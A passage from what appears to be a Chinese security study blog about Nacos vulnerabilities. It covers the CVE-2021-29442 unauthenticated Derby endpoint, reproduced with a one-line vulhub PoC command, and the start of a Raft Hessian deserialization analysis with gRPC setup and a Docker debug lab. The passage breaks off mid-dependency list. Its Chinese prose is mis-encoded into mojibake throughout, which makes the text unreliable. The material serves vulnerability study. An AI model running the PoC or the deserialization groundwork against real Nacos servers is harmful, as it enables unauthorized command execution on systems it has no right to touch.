ä¸€ä¸ªæ–°ç”¨æˆ·</p><p><img src="https://cdn.clown2024.cn/image-20250308163614387.png" alt="image-20250308163614387"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ç”¨è¯¥ç”¨æˆ·å»ç™»å½•åå°äº†</p><p><img src="https://cdn.clown2024.cn/image-20250308163751992.png" alt="image-20250308163751992"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ç”¨æˆ·æ˜¯æ·»åŠ æˆåŠŸäº†ï¼Œå›æ¥çš„æ˜¯ç”¨æˆ·åå’ŒåŠ å¯†å¯†ç </p><h1 id="æœªæˆæƒæ¥å£å‘½ä»¤æ‰§è¡Œæ¼æ´cve-2021-29442"><a href="#æœªæˆæƒæ¥å£å‘½ä»¤æ‰§è¡Œæ¼æ´-CVE-2021-29442" class="headerlink" title="æœªæˆæƒæ¥å£å‘½ä»¤æ‰§è¡Œæ¼æ´(CVE-2021-29442)"></a>æœªæˆæƒæ¥å£å‘½ä»¤æ‰§è¡Œæ¼æ´(CVE-2021-29442)</h1><p><strong>å½±å“ç‰ˆæœ¬</strong></p><p>Nacos &lt; 1.4.1</p><p><strong>æ¼æ´è¯¦æƒ…</strong></p><p>åœ¨Nacos 1.4.1ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œä¸€äº›APIç«¯ç‚¹ï¼ˆå¦‚<code>/nacos/v1/cs/ops/derby</code>ï¼‰å¯ä»¥é»˜è®¤æ²¡æœ‰é‰´æƒï¼Œå¯ä»¥è¢«æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·å…¬å¼€è®¿é—®ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„Derby SQLè¯­å¥å’Œ Java ä»£ç ã€‚</p><p><strong>å¤ç°</strong></p><p>è®¿é—®ä¸€ä¸‹&#x2F;nacos&#x2F;v1&#x2F;cs&#x2F;ops&#x2F;derbyæ¥å£</p><p><img src="https://cdn.clown2024.cn/image-20250308220533168.png" alt="image-20250308220533168"></p><p>å¯ä»¥çœ‹åˆ°æœªé‰´æƒ</p><p>Derbyæ˜¯ç”¨javaç¼–å†™çš„ä¸€ä¸ªæ•°æ®åº“ï¼Œå¯ä»¥ä¸Šä¼ jaråŒ…rceï¼Œç›´æ¥ç”¨vulhubçš„pocéªŒè¯å³å¯ï¼ˆåŸç†å…ˆç©ºç€ğŸ¥²ï¼‰</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python poc.py -t http://your-ip:8848 -c <span class="hljs-string">&quot;root&quot;</span>  <br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250308222525087.png" alt="image-20250308222525087"></p><h1 id="raft-hessianååºåˆ—åŒ–"><a href="#Raft-Hessianååºåˆ—åŒ–" class="headerlink" title="Raft Hessianååºåˆ—åŒ–"></a>Raft Hessianååºåˆ—åŒ–</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>æ¼æ´å½±å“çš„èŒƒå›´æ˜¯nacosçš„7848ç«¯å£</p><p>7848ç«¯å£æ˜¯ç”¨äºNacosé›†ç¾¤é—´Raftåè®®çš„é€šä¿¡ï¼Œè¯¥ç«¯å£çš„æœåŠ¡åœ¨å¤„ç†éƒ¨åˆ†Jraftè¯·æ±‚æ—¶ä¼šä½¿ç”¨Hessianè¿›è¡Œååºåˆ—åŒ–</p><p>Nacos 1.xåœ¨å•æœºæ¨¡å¼ä¸‹é»˜è®¤ä¸å¼€æ”¾7848ç«¯å£ï¼Œæ•…è¯¥æƒ…å†µé€šå¸¸ä¸å—æ­¤æ¼æ´å½±å“ã€‚ç„¶è€Œï¼Œ2.xç‰ˆæœ¬æ— è®ºå•æœºæˆ–é›†ç¾¤æ¨¡å¼å‡é»˜è®¤å¼€æ”¾7848ç«¯å£ã€‚</p><p>æ‰€ä»¥å½±å“èŒƒå›´ä¸ºï¼š</p><p>1.4.0 &lt;&#x3D; Nacos &lt; 1.4.6 ä½¿ç”¨clusteré›†ç¾¤æ¨¡å¼è¿è¡Œ<br>2.0.0 &lt;&#x3D; Nacos &lt; 2.2.3 ä»»æ„æ¨¡å¼å¯åŠ¨å‡å—åˆ°å½±å“</p><h2 id="å‰ç½®çŸ¥è¯†äº†è§£"><a href="#å‰ç½®çŸ¥è¯†äº†è§£" class="headerlink" title="å‰ç½®çŸ¥è¯†äº†è§£"></a>å‰ç½®çŸ¥è¯†äº†è§£</h2><h3 id="grpc-java"><a href="#grpc-java" class="headerlink" title="grpc-java"></a>grpc-java</h3><p>nacosçš„å®¢æˆ·ç«¯å’Œå’Œserverä¹‹é—´æ˜¯é€šè¿‡HTTPæ¥é€šä¿¡çš„ï¼Œè€Œé›†ç¾¤èŠ‚ç‚¹é—´æ˜¯ä»¥grpcæ¥é€šä¿¡çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç­‰ä¼šæ„é€ æ•°æ®åŒ…çš„æ—¶å€™å°±æ˜¯ä»¥grpcçš„å½¢å¼</p><p>grpcçš„ä½¿ç”¨å¯ä»¥å‚è€ƒä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://grpc.io/docs/languages/java/generated-code/">https://grpc.io/docs/languages/java/generated-code/</a></p><p>è¿˜æœ‰å®˜æ–¹çš„ä»£ç ä»“åº“ï¼š<a href="https://github.com/grpc/grpc-java">https://github.com/grpc/grpc-java</a></p><p><strong>å…ˆæ·»åŠ ä¾èµ–</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.grpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>grpc-netty-shaded<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.50.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.grpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>grpc-protobuf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.50.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.grpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>grpc-stub<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.50.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--è¿è¡ŒæœåŠ¡ç«¯éœ€è¦--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.grpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>grpc-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.50.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>å®šä¹‰protoæ–‡ä»¶</strong></p><p>åœ¨src&#x2F;mainç›®å½•ä¸‹åˆ›å»ºprotoç›®å½•ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªprotoæ–‡ä»¶</p><figure class="highlight protobuf"><table><tr><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br><span class="hljs-keyword">option</span> java_multiple_files = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">option</span> java_package = <span class="hljs-string">&quot;com.example.grpc.api&quot;</span>;<br><br><span class="hljs-keyword">service </span><span class="hljs-title class_">Greeter</span> &#123;<br>  <span class="hljs-function"><span class="hljs-keyword">rpc</span> SayHello (HelloRequest) <span class="hljs-keyword">returns</span> (HelloReply) </span>&#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloRequest</span> &#123;<br>  <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloReply</span> &#123;<br>  <span class="hljs-type">string</span> message = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250329165534865.png" alt="image-20250329165534865"></p><p><strong>ç”Ÿæˆä»£ç </strong></p><p>å¯ä»¥ç”¨Mavenæ’ä»¶æˆ–è€…å‘½ä»¤è¡Œå·¥å…·ç”Ÿæˆ</p><p>æ’ä»¶çš„ç”¨æ³•å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://grpc.io/docs/languages/java/generated-code/#codegen">https://grpc.io/docs/languages/java/generated-code/#codegen</a></p><blockquote><p>emmmè¿™é‡Œæˆ‘çš„æ’ä»¶ä¾èµ–ä¸€ç›´æ˜¯çº¢çš„ï¼Œç”¨ä¸äº†</p></blockquote><p>è¿™é‡Œè¿˜æ˜¯ç”¨å‘½ä»¤è¡Œçš„å½¢å¼</p><p>é¦–å…ˆä¸‹è½½protobufï¼š<a href="https://github.com/protocolbuffers/protobuf">https://github.com/protocolbuffers/protobuf</a></p><p>ç„¶åä¸‹è½½æ’ä»¶ï¼š<a href="https://repo1.maven.org/maven2/io/grpc/protoc-gen-grpc-java/">https://repo1.maven.org/maven2/io/grpc/protoc-gen-grpc-java/</a></p><p>æ¥ä¸‹æ¥è¿›åˆ°æˆ‘ä»¬çš„protoç›®å½•ï¼Œç„¶åå°†åˆšåˆšä¸‹è½½çš„grpc-javaæ’ä»¶ç§»åˆ°è¿™é‡Œå¹¶é‡å‘½åä¸º<code>protoc-gen-grpc-java</code></p><p><img src="https://cdn.clown2024.cn/image-20250329165727150.png" alt="image-20250329165727150"></p><p>ç„¶åç”¨ä¸‹é¢å‘½ä»¤ç”Ÿæˆä»£ç </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">protoc --plugin=protoc-gen-grpc-java.exe --grpc-java_out=../java --java_out=../java helloworld.proto<br><span class="hljs-comment"># --plugin æŒ‡å®š gRPC-Java æ’ä»¶ï¼ˆéœ€å¯æ‰§è¡Œæ–‡ä»¶ï¼‰</span><br><span class="hljs-comment"># --grpc-java_out è¾“å‡º gRPC æœåŠ¡ä»£ç åˆ° ../java</span><br><span class="hljs-comment"># --java_out è¾“å‡ºæ™®é€š Java æ¶ˆæ¯ç±»åˆ° ../java</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹protobufçš„ç‰ˆæœ¬ï¼Œæˆ‘ç”¨æ¯”è¾ƒæ–°çš„ç‰ˆæœ¬ç”Ÿæˆçš„ä»£ç ä¼šæœ‰äº›ä¾èµ–æ²¡æœ‰ï¼Œæ¢æˆæ¯”è¾ƒä½çš„23.2ç‰ˆæœ¬æ‰è¡Œ</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20250329174707984.png" alt="image-20250329174707984"></p><p>ç„¶åå°±æ˜¯å®ç°å…·ä½“çš„ä»£ç </p><p><strong>ç¼–å†™æœåŠ¡ç«¯å®ç°ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.service;<br><br><span class="hljs-keyword">import</span> com.example.grpc.api.GreeterGrpc;<br><span class="hljs-keyword">import</span> com.example.grpc.api.HelloReply;<br><span class="hljs-keyword">import</span> com.example.grpc.api.HelloRequest;<br><span class="hljs-keyword">import</span> io.grpc.stub.StreamObserver;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GreeterService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GreeterGrpc</span>.GreeterImplBase &#123;<br><br>    <span class="hljs-comment">// å®ç°æ–¹æ³•</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HelloRequest request, StreamObserver&lt;HelloReply&gt; responseObserver)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> request.getName();<br>        <span class="hljs-type">HelloReply</span> <span class="hljs-variable">helloReply</span> <span class="hljs-operator">=</span> HelloReply.newBuilder().setMessage(<span class="hljs-string">&quot;Hello, &quot;</span>+name).build();<br>        responseObserver.onNext(helloReply);<br>        responseObserver.onCompleted();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>è¿è¡ŒæœåŠ¡</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.service;<br><br><span class="hljs-keyword">import</span> io.grpc.Server;<br><span class="hljs-keyword">import</span> io.grpc.ServerBuilder;<br><span class="hljs-comment">// å¯åŠ¨æœåŠ¡</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GreeterServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8888</span>;<br>        <span class="hljs-type">Server</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> ServerBuilder.forPort(port).addService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GreeterService</span>()).build();<br>        server.start();<br><br>        System.out.println(<span class="hljs-string">&quot;Running...&quot;</span>);<br>        server.awaitTermination();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å®ç°å®¢æˆ·ç«¯ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.client;<br><br><span class="hljs-keyword">import</span> com.example.grpc.api.GreeterGrpc;<br><span class="hljs-keyword">import</span> com.example.grpc.api.HelloReply;<br><span class="hljs-keyword">import</span> com.example.grpc.api.HelloRequest;<br><span class="hljs-keyword">import</span> io.grpc.Channel;<br><span class="hljs-keyword">import</span> io.grpc.ManagedChannelBuilder;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GreeterClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8888</span>;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();<br>        GreeterGrpc.<span class="hljs-type">GreeterBlockingStub</span> <span class="hljs-variable">greeterBlockingStub</span> <span class="hljs-operator">=</span> GreeterGrpc.newBlockingStub(channel);<br>        <span class="hljs-type">HelloRequest</span> <span class="hljs-variable">helloRequest</span> <span class="hljs-operator">=</span> HelloRequest.newBuilder().setName(<span class="hljs-string">&quot;clown&quot;</span>).build();<br>        <span class="hljs-type">HelloReply</span> <span class="hljs-variable">helloReply</span> <span class="hljs-operator">=</span> greeterBlockingStub.sayHello(helloRequest);<br>        System.out.println(helloReply.getMessage());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250329181930632.png" alt="image-20250329181930632"></p><h3 id="jraftåè®®"><a href="#JRaftåè®®" class="headerlink" title="JRaftåè®®"></a>JRaftåè®®</h3><p>æœ‰å…³Raftç®—æ³•çš„çŸ¥è¯†éœ€è¦æå‰äº†è§£ä¸€ä¸‹ï¼ŒRaftæ˜¯ä¸€ç§å¸¸ç”¨äºé›†ç¾¤é—´æ•°æ®åŒæ­¥çš„å…±è¯†ç®—æ³•ï¼ŒJRaftæ˜¯å…¶javaå®ç°ï¼Œè¿™ä¸ªå°±ä¸åœ¨è¿™é‡Œå¤šä»‹ç»äº†ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://www.sofastack.tech/projects/sofa-jraft/overview/">https://www.sofastack.tech/projects/sofa-jraft/overview/</a></p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>è¿™é‡Œä¸‹è½½ä¸€ä¸ª2.2.2ç‰ˆæœ¬çš„nacosï¼š<a href="https://github.com/alibaba/nacos/releases/tag/2.2.2">https://github.com/alibaba/nacos/releases/tag/2.2.2</a></p><p>å› ä¸ºè¿™é‡Œåªéœ€è¦å¯åŠ¨å•æœºæ¨¡å¼å³å¯éªŒè¯ï¼Œè€Œä¸”é»˜è®¤å¯åŠ¨å†…åµŒDerbyæ•°æ®åº“ï¼Œå¯ä»¥å†™ä¸€ä¸ªç®€å•çš„dockeræ¥é…ç½®</p><p>dockerfileæ–‡ä»¶</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> docker.xuanyuan.me/openjdk:<span class="hljs-number">8</span>u342-jre<br><br><span class="hljs-comment"># å¤åˆ¶å½’æ¡£æ–‡ä»¶å¹¶è‡ªåŠ¨è§£å‹</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> nacos-server-2.2.2.tar.gz /root</span><br><br><span class="hljs-comment"># å®‰è£…ç½‘ç»œå’Œè¿›ç¨‹ç®¡ç†å·¥å…·åŒ…ï¼Œ-y è¡¨ç¤ºè‡ªåŠ¨ç¡®è®¤æ‰€æœ‰å®‰è£…æç¤º</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt update &amp;&amp; \</span><br><span class="language-bash">    apt install net-tools procps -y</span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /root</span><br></code></pre></td></tr></table></figure><p>docker-composeæ–‡ä»¶</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile">version: <span class="hljs-string">&#x27;3&#x27;</span><br><br>services:<br>  nacos:<br>    build: .<br>    container_name: nacos<br>    ports:<br>      - <span class="hljs-number">5005</span>:<span class="hljs-number">5005</span> <span class="hljs-comment"># å¼€å¯è¿œç¨‹è°ƒè¯•ç«¯å£</span><br>      - <span class="hljs-number">7848</span>:<span class="hljs-number">7848</span> <span class="hljs-comment"># å¼€å¯JRaftç«¯å£</span><br>      - <span class="hljs-number">8848</span>:<span class="hljs-number">8848</span> <span class="hljs-comment"># nacosæ§åˆ¶å°ç«¯å£</span><br>    environment:<br>      - JAVA_OPT=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span> <span class="hljs-comment"># å¼€å¯è¿œç¨‹è°ƒè¯•çš„å¯åŠ¨å‚æ•°</span><br>    command: <br>      - /bin/sh<br>      - -c<br>      - |<br>        bash nacos/bin/startup.sh -m standalone<br>        tail -f nacos/logs/start.out<br></code></pre></td></tr></table></figure><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å¯ä»¥çœ‹ä¸€ä¸‹ä¿®å¤çš„è¡¥ä¸ï¼š<a href="https://github.com/alibaba/nacos/pull/10542/files">https://github.com/alibaba/nacos/pull/10542/files</a></p><p>çœ‹ä¿®å¤çš„è¡¥ä¸æˆ‘ä»¬ä¹Ÿå¯ä»¥å¾ˆæ˜æ˜¾åœ°çŸ¥é“ï¼Œä»–åŠ äº†ä¸€ä¸ªHessianååºåˆ—åŒ–çš„ç™½åå•</p><p><img src="https://cdn.clown2024.cn/image-20250328234639269.png" alt="image-20250328234639269"></p><p>æˆ‘ä»¬å…ˆæ‰¾æ‰¾ä»–æ˜¯åœ¨å“ªé‡Œè¿›è¡Œçš„Hessianååºåˆ—åŒ–</p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¸‹è½½æºç æ¥çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20250328235032707.png" alt="image-20250328235032707"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œé»˜è®¤ç”¨çš„å°±æ˜¯Hessianï¼Œ<code>com.alibaba.nacos.consistency.SerializeFactory#getDefault</code> åºåˆ—åŒ–å·¥å‚ç±»</p><p>ååºåˆ—åŒ–çš„åœ°æ–¹ä¹Ÿå¾ˆå®¹æ˜“çŸ¥é“</p><p><img src="https://cdn.clown2024.cn/image-20250328235202888.png" alt="image-20250328235202888"></p><p>å¯ä»¥çœ‹åˆ°æœ‰æ¼æ´çš„ç‰ˆæœ¬æ²¡æœ‰ä»»ä½•è¿‡æ»¤</p><h3 id="æœ¬åœ°å¯åŠ¨"><a href="#æœ¬åœ°å¯åŠ¨" class="headerlink" title="æœ¬åœ°å¯åŠ¨"></a>æœ¬åœ°å¯åŠ¨</h3><p>å°±æ˜¯çªç„¶æƒ³è®°å½•ä¸€ä¸‹ï¼ˆ</p><p>æ‰¾åˆ°è¿™æ ·ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_41316955/article/details/135467159">https://blog.csdn.net/qq_41316955/article/details/135467159</a></p><p>æ ¹æ®ä»–çš„æ­¥éª¤æ¥</p><p>æˆ‘ä»¬è¦å…ˆç¼–è¯‘ä¸€ä¸‹é¡¹ç›®ï¼Œç›®çš„æ˜¯ä¸ºäº†ç”Ÿæˆä¸€ä¸‹grpcçš„ä»£ç </p><p><img src="https://cdn.clown2024.cn/image-20250330213233054.png" alt="image-20250330213233054"></p><p>ç„¶åå»consistencyç›®å½•</p><p><img src="https://cdn.clown2024.cn/image-20250330212610402.png" alt="image-20250330212610402"></p><p>æ·»åŠ protoç›®å½•ä¸ºSource Root</p><p>ç„¶åæ‰¾åˆ°nacos-consoleè¿™ä¸ªæ¨¡å—ï¼Œç›´æ¥è¿è¡Œconsoleæ¨¡å—é‡Œçš„ com.alibaba.nacos.Nacos.javaï¼Œåœ¨IDEAçš„JVMçš„å¯åŠ¨å‚æ•°é…ç½®ä¸ºå•æœºå¯åŠ¨å’Œé…ç½®nacosçš„å·¥ä½œç›®å½•</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">-Dnacos.standalone=<span class="hljs-literal">true</span> -Dnacos.home=D:\CTF\Java\Nacos\nacos-2.2.2\nacos-2.2.2<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250330213058726.png" alt="image-20250330213058726"></p><p>ç„¶åæˆ‘ä»¬ç°åœ¨å†å¯åŠ¨å°±å¯ä»¥äº†</p><p><img src="https://cdn.clown2024.cn/image-20250330213510138.png" alt="image-20250330213510138"></p><h3 id="æ–­ç‚¹è°ƒè¯•"><a href="#æ–­ç‚¹è°ƒè¯•" class="headerlink" title="æ–­ç‚¹è°ƒè¯•"></a>æ–­ç‚¹è°ƒè¯•</h3><p>è¿™é‡Œå¯ä»¥å‚è€ƒå‰é¢å†™çš„javaè¿œç¨‹è°ƒè¯•ï¼Œä¹‹å‰æ²¡è¯¦ç»†è®°å½•ï¼Œè¿™é‡Œå†é¡ºä¾¿å†™ä¸€ä¸‹</p><p>å‰é¢çš„dockerå·²ç»å¼€æ”¾äº†5005çš„è¿œç¨‹è°ƒè¯•ç«¯å£ç»™æˆ‘ä»¬äº†</p><p>è¿™é‡Œå¼€ä¸€ä¸ªjvm debugé€‰é¡¹</p><p><img src="https://cdn.clown2024.cn/image-20250330214919561.png" alt="image-20250330214919561"></p><p>ç„¶åå¯åŠ¨å³å¯</p><p><img src="https://cdn.clown2024.cn/image-20250330215002173.png" alt="image-20250330215002173"></p><p>ç›®å‰å°±æ˜¯çŸ¥é“äº†hessianååºåˆ—åŒ–ï¼Œä½†æ˜¯åœ¨å“ªé‡Œè°ƒç”¨ï¼Œåœ¨å“ªé‡Œè§¦å‘å‘¢</p><p>å¦‚æœè¦å‘ç”Ÿååºåˆ—åŒ–ï¼Œé‚£å°±è‚¯å®šæ˜¯åœ¨å‘ç”Ÿæ•°æ®è¯»å–æˆ–è€…åº”ç”¨çš„åœ°æ–¹ï¼Œåœ¨JRaftä¸­ï¼Œæäº¤çš„ä»»åŠ¡æœ€ç»ˆå°†ä¼šå¤åˆ¶åº”ç”¨åˆ°æ‰€æœ‰ raft èŠ‚ç‚¹ä¸Šçš„çŠ¶æ€æœºã€‚onApply æ˜¯StateMachineæœ€æ ¸å¿ƒçš„æ–¹æ³•ã€‚</p><p>nacosè¿™é‡Œå°±æ˜¯åœ¨<code>com.alibaba.nacos.core.distributed.raft.NacosStateMachine#onApply</code>æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20250330220732661.png" alt="image-20250330220732661"></p><p>æˆ‘ä»¬æ¥ä¸‹æ¥æ„é€ ä¸€ä¸ªJRaftå†™è¯·æ±‚å»çœ‹çœ‹ä»–çš„è°ƒç”¨å †æ ˆ</p><h3 id="æ„é€ è¯·æ±‚"><a href="#æ„é€ è¯·æ±‚" class="headerlink" title="æ„é€ è¯·æ±‚"></a>æ„é€ è¯·æ±‚</h3><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦å»æ„å»ºä¸€ä¸ªå†™è¯·æ±‚(WriteRequest)ï¼Œæ¨¡æ‹Ÿæ•°æ®å˜æ›´</p><p>grpcæ‰€éœ€è¦çš„protoæ–‡ä»¶åœ¨<code>nacos-2.2.2/consistency/src/main/proto/</code>é‡Œé¢</p><p>å»çœ‹æºç å¯ä»¥çœ‹åˆ°ï¼Œæœ‰å…³ä¸€äº›ç±»å¹¶ä¸å­˜åœ¨</p><p><img src="https://cdn.clown2024.cn/image-20250330205549132.png" alt="image-20250330205549132"></p><p>è¿™äº›éƒ½åœ¨.protoæ–‡ä»¶é‡Œé¢ï¼Œå°†è¯¥æ–‡ä»¶æ”¾åˆ°æˆ‘ä»¬å‰é¢çš„grpcé¡¹ç›®è¿›è¡Œç¼–è¯‘ç”Ÿæˆä»£ç </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">.\protoc.exe --plugin=protoc-gen-grpc-java.exe --grpc-java_out=../java --java_out=../java consistency.proto<br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å‚è€ƒJRaftçš„æ–‡æ¡£å»å†™å®¢æˆ·ç«¯ï¼š<a href="https://www.sofastack.tech/projects/sofa-jraft/counter-example/%EF%BC%88%E4%BD%86%E6%98%AF%E4%B8%8D%E5%A4%AA%E5%A5%BD%E5%86%99%EF%BC%8C%E6%88%91%E4%B9%9F%E4%B8%8D%E7%9F%A5%E9%81%93%E4%BB%96%E4%BB%AC%E6%98%AF%E5%92%8B%E5%8F%82%E8%80%83%E7%9A%84%F0%9F%A5%B2%EF%BC%89">https://www.sofastack.tech/projects/sofa-jraft/counter-example/ï¼ˆä½†æ˜¯ä¸å¤ªå¥½å†™ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä»–ä»¬æ˜¯å’‹å‚è€ƒçš„ğŸ¥²ï¼‰</a></p><p>å¼•å…¥ä¸‹é¢çš„ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alipay.sofa<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jraft-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span 